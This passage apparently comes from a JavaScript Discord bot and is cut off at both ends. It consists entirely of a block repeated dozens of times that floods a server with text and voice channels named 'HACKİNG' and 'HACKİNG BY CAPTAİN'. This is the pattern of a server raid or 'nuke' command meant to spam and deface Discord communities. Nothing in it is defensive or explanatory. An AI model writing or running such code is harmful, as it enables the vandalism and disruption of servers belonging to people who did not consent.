        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
